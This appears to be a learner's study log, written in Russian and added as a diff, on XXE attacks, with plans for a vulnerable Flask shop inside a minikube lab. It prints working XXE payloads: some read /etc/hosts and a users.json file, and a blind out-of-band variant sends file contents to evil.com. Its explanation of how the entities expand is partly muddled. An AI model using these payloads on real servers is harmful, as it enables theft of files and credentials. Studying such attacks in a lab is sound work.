@@ -1,0 +1,103 @@
+1)
+Изучил суть XXE уязвимости. Суть заключается в небезопасном парсинге XML-парсером внешних сущностей в XML файле.
+Пример на котором я понял суть атаки:
+Сценарий:
+ - Пользователь отпрпвляет подобный XML файл:
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE Product [
+  <!ENTITY xxe SYSTEM "file:///etc/hosts">
+]>
+<Product>
+  <Name>&xxe;</Name>
+</Product>
+
+ - Сервер, заранее настроенный на парсинг чисел из XML, выводит содержимое файла /etc/hosts, и только потом заявляет об ошибке.
+Это говорит о том, что сервер не блокирует внешние сущности и уязвим к XXE атаке.
+Этот сценарий, когда результат обработки XML возвращается напрямую пользователю, является очень простым и опасным, 
+поэтому мне показался слишком простым, поэтому я хочу реализовать случай, когда сервер не возвращает результат напрямую пользователю.
+Данный сценарий реализуем, если в XML использованы параметризованные сущности:
+ <!ENTITY % testEntity SYSTEM "https://evil.com/xxe_endpoint">
+XML:
+  <?xml version="1.0" encoding="utf-8"?>
+  <!DOCTYPE test [
+    <!ELEMENT test ANY>
+    <!ENTITY % testEntity SYSTEM "https://evil.com/xxe_endpoint">
+    %testEntity;
+    %param;
+    %query;
+  ]>
+А на внешнем сервере передается подобное содержимое:
+ <!ENTITY % file SYSTEM "file:///path/to/file">
+ <!ENTITY % param "<!ENTITY &#x25; query SYSTEM 'http://evil.com/xxe_endpoint?data=%file;'>">
+Тогда test entity превратит XML файл в следующий вид:
+  <?xml version="1.0" encoding="utf-8"?>
+  <!DOCTYPE test [
+    <!ELEMENT test ANY>
+    <!ENTITY % testEntity SYSTEM "https://evil.com/xxe_endpoint">
+    <!ENTITY % get SYSTEM "file:///path/to/file">
+    <!ENTITY % file "<!ENTITY &#x25; query SYSTEM 'http://evil.com/xxe_endpoint?data=%file;'>">
+    <!ENTITY % query SYSTEM 'http://evil.com/xxe_endpoint?data=%file;'>
+  %param;
+  %query;
+  ]>
+Здесь сервер за счет testEntity сделает запрос к evil.com, который создаст запрос к path/to/file с помощью file,
+а сущность query создаст сетевой запрос на evil.com, который передаст path/to/file.
+
+Для экплуатации данного сценария я хочу сделать Kubernetes кластер на minikube с 2мя приложениями
+ - Одно будет возвращать ответ на XML пользователью, второе нет.
+Приложение - виртуальный магазин, с возможностью регистрации пользователя по логину и паролю.
+Данные о заказах, товарах и ID пользователей будут храниться в БД под Volume.
+Данные о логинах, паролях и балансе будет храниться в БД под Secret.
+
+Для реализации XXE атаки мне возможно потребуется сервер для обработки XML запросов условным злоумышленником.
+(Возможно идею с 2мя приложениями на кластере я отброшу, если не потяну)
+
+2)
+#update
+Поставил dokcer, dokcer compose, minikube, kubectl
+Также создал первичный фронтенд целевого приложения на Flask с данной моделю поведения
+При оформлении заказа приложение создает XML файл с формой заказа, сервер обрабатывает ее и возвращает ответ пользователю.
+Также изучил Burp Suite и с помощью Proxy и Intercept вспомнил как перехватывать запросы, а также менять в них XML так как
+суть XXE атаки заключается в подмене XML, со внешними сущностями, которые позволяют получить доступ к данным приложения, (пока для
+примера сделал БД в виде json файлов, в будущем сделаю нормальную БД)
+Роадмап на следующие апдейты
+- Собрать приложение в Docker контейнер
+- Поднять Kubernetes кластер на Minikube
+- Закрепить контейнеры с приложениями в Worker Nodes, описать для каждой версии: Pod, Deployment
+- Поместить БД в Volume, Secret и описать для каждой из них Pod, Deployment.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE request [
+    <!ENTITY demo SYSTEM "file:///C://Users/Maks/Desktop/app/data/users.json">
+]>
+<request>
+    <value>&demo;</value>
+</request>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE order [
+    <!ENTITY steal SYSTEM "file:///C:/Users/Maks/Desktop/app/data/users.json">
+]>
+<order>
+    <product_id>&steal;</product_id>
+    <quantity>4</quantity>
+</order>
